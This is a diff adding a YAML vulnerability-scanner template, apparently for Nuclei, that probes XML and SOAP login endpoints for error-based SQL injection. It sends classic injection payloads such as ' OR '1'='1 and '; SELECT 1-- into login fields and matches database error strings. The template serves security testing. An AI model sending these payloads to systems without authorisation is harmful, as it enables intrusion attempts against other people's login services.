@@ -1,0 +1,137 @@
+id: sqli-error-based-detection-xml
+info:
+  name: SQL Injection Error Based — XML / SOAP
+  author: reewardius
+  severity: high
+  description: Detects SQL injection via error messages in XML and SOAP endpoints
+  tags: sqli,injection,xml,soap
+
+http:
+  # Вариант 1: login + password (plain XML)
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/api/auth"
+      - "{{BaseURL}}/api/auth/login"
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/api/sign-in"
+      - "{{BaseURL}}/api/sigin"
+      - "{{BaseURL}}/api/v1/login"
+      - "{{BaseURL}}/api/v2/login"
+      - "{{BaseURL}}/api/v3/login"
+      - "{{BaseURL}}/api/v1/auth"
+      - "{{BaseURL}}/api/v2/auth"
+      - "{{BaseURL}}/api/v3/auth"
+      - "{{BaseURL}}/auth/login"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/sign-in"
+      - "{{BaseURL}}/signin"
+    headers:
+      Content-Type: application/xml
+      Accept: application/xml
+    body: |
+      
+      <auth>
+        <login>{{injection_payload}}</login>
+        <password>test123</password>
+      </auth>
+    payloads:
+      injection_payload:
+        - "'"
+        - "''"
+        - "' OR '1'='1"
+        - "' OR 1=1--"
+        - "'; SELECT 1--"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SQL error code"
+          - "Dynamic SQL Error"
+          - "Token unknown"
+          - "syntax error"
+          - "mysql_fetch"
+          - "ORA-00933"
+          - "pg_query()"
+        condition: or
+
+  # Вариант 2: email + pass (plain XML)
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/auth"
+      - "{{BaseURL}}/xml/login"
+    headers:
+      Content-Type: application/xml
+      Accept: application/xml
+    body: |
+      
+      <credentials>
+        <email>{{injection_payload}}</email>
+        <pass>test123</pass>
+      </credentials>
+    payloads:
+      injection_payload:
+        - "'"
+        - "''"
+        - "' OR '1'='1"
+        - "' OR 1=1--"
+        - "'; SELECT 1--"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SQL error code"
+          - "Dynamic SQL Error"
+          - "Token unknown"
+          - "syntax error"
+          - "mysql_fetch"
+          - "ORA-00933"
+          - "pg_query()"
+        condition: or
+
+  # Вариант 3: username + password (SOAP envelope)
+  - method: POST
+    path:
+      - "{{BaseURL}}/soap/login"
+      - "{{BaseURL}}/ws/auth"
+      - "{{BaseURL}}/service.asmx"
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: "http://tempuri.org/Login"
+    body: |
+      
+      <soap:Envelope
+        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+        xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <Login xmlns="http://tempuri.org/">
+            <username>{{injection_payload}}</username>
+            <password>test123</password>
+          </Login>
+        </soap:Body>
+      </soap:Envelope>
+    payloads:
+      injection_payload:
+        - "'"
+        - "''"
+        - "' OR '1'='1"
+        - "' OR 1=1--"
+        - "'; SELECT 1--"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SQL error code"
+          - "Dynamic SQL Error"
+          - "Token unknown"
+          - "syntax error"
+          - "mysql_fetch"
+          - "ORA-00933"
+          - "pg_query()"
+          - "faultstring"
+          - "soap:Fault"
+        condition: or
